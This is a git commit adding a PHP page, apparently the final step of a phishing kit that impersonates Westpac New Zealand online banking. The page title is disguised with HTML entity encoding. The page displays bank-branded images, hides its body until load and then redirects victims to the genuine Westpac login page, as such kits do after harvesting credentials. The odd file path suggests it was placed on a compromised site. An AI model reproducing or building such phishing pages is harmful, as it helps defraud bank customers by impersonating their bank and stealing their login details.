78c302a738ed799ad14defd6eb0fedced6760618
accounts-access <morraccounts-access@users.noreply.github.com>
2018-05-07 12:16:19 +1200

    West

---
+++ AdminahUKEwj7gPmR7O_aAhWnrlQKHfwoBj0QFgg8MAc&url=https%3A%2F%2Fwww.zalora.com.my%2Fshoes%2Ftomaz%2F&usg=AOvVaw1_mBned3PWoV1uj7l2ZeeC/step3.php
@@ -0,0 +1,41 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>&#87;&#101;&#115;&#116;&#112;&#97;&#99;&#32;&#79;&#110;&#101;&#174;&#32;&#45;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon"
+              href="images/favicon.ico"/>	
+		<html><meta http-equiv="Refresh" content="05; url=https://bank.westpac.co.nz/one/app.html#login"></html>
+<script type="text/javascript">
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+</script>
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 1332px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+</style>
+
+</head>
+<body style="visibility:hidden" onload="unhideBody()">
+<div id="container">
+<div id="image4" style="position:absolute; overflow:hidden; left:191px; top:15px; width:60px; height:36px; z-index:0"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=60 height=36></a></div>
+
+<div id="image1" style="position:absolute; overflow:hidden; left:182px; top:66px; width:968px; height:259px; z-index:1"><img src="images/w17.png" alt="" title="" border=0 width=968 height=259></div>
+
+<div id="image3" style="position:absolute; overflow:hidden; left:523px; top:256px; width:64px; height:64px; z-index:2"><img src="images/w.gif" alt="" title="" border=0 width=64 height=64></div>
+
+</div>
+
+</body>
+</html>
